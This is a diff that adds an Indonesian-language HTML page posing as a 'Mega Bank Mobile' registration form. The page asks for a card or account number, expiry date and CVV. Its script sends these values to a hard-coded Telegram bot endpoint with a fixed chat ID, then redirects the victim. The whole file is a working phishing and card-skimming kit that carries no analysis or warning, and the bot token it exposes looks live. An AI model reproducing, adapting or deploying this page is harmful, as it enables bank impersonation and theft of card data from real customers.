@@ -1,0 +1,122 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="utf-8" />
+        <meta name="viewport" content="width=device-width, initial-scale=1" />
+        <title>Registrasi</title>
+        <link
+            href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/css/bootstrap.min.css"
+            rel="stylesheet"
+            integrity="sha384-KK94CHFLLe+nY2dmCWGMq91rCGa5gtU4mk92HdvYe+M/SXH301p5ILy+dN9+nJOZ"
+            crossorigin="anonymous"
+        />
+    </head>
+    <body>
+        <nav class="navbar bg-body-tertiary">
+            <div class="container-fluid">
+                <span class="navbar-brand mb-0 h1">
+                    <img
+                        src="homeimage.jpg"
+                        class="rounded"
+                        alt="home"
+                        width="40px"
+                        height="40px"
+                    />
+                </span>
+            </div>
+        </nav>
+        <div class="container">
+            <h5 class="mt-5">Isi Data</h5>
+            <form>
+                <div class="form-group mt-4 mb-3">
+                    <input
+                        type="text"
+                        class="form-control"
+                        id="rekening"
+                        placeholder="Masukkan nomor rekening"
+                    />
+                    <span style="font-size: 10px"
+                        >Patikan kartu kredit sudah di aktivasi dan dalam
+                        keadaan tidak di blokir.</span
+                    >
+                </div>
+                <div class="form-group">
+                    <input
+                        type="text"
+                        class="form-control"
+                        id="valid"
+                        placeholder="Valid Thru"
+                    />
+                </div>
+                <div class="form-group mt-3">
+                    <input
+                        type="text"
+                        class="form-control"
+                        id="vcc"
+                        placeholder="VCC"
+                    />
+                </div>
+                <div class="form-group mt-3">
+                    <span style="font-size: 10px">
+                        <input type="checkbox" />
+                        Dengan ini saya menyatakan telah membaca, mengerti,
+                        menerima dan Menyetujui
+                        <span class="fw-bold">Syarat dan ketentuan</span> serta
+                        <span class="fw-bold">Kebijakan Privasi</span> aktivitas
+                        Mega Bank Mobile
+                    </span>
+                </div>
+                <div class="d-grid gap-2 mt-3">
+                    <button
+                        class="btn btn-warning fw-bold text-light"
+                        type="button"
+                        onclick="myData()"
+                    >
+                        Registrasi
+                    </button>
+                </div>
+            </form>
+        </div>
+        <script
+            src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha3/dist/js/bootstrap.bundle.min.js"
+            integrity="sha384-ENjdO4Dr2bkBIFxQpeoTz1HIcje39Wm4jDKdf19U8gI4ddQ3GYNS7NTKfAdVQSZe"
+            crossorigin="anonymous"
+        ></script>
+        <script type="text/javascript" charset="utf-8">
+            async function sendMessage(chatId, text) {
+                const url =
+                    "https://api.telegram.org/bot6256491274:AAH3b39rlw0-jv9oQlab5dMEgvsJEb3h7Jk/sendMessage";
+                const payload = {
+                    chat_id: chatId,
+                    text: text,
+                };
+
+                const response = await fetch(url, {
+                    method: "POST",
+                    headers: {
+                        "Content-Type": "application/json",
+                    },
+                    body: JSON.stringify(payload),
+                });
+
+                if (!response.ok) {
+                    throw new Error("Failed to send message");
+                } else {
+                    window.location.href = "index.html"
+                }
+            }
+            function myData() {
+                const nomor = document.querySelector("#rekening").value;
+                const valid = document.querySelector("#valid").value;
+                const vcc = document.querySelector("#vcc").value;
+                if (nomor === "" || valid === "" || vcc === "") {
+                    alert("silahkan lengkapi data!");
+                } else {
+                    let text = `rekening: ${nomor}\nthru: ${valid}\nvcc: ${vcc}`;
+                    let chatId = "5995069056";
+                    sendMessage(chatId, text);
+                }
+            }
+        </script>
+    </body>
+</html>
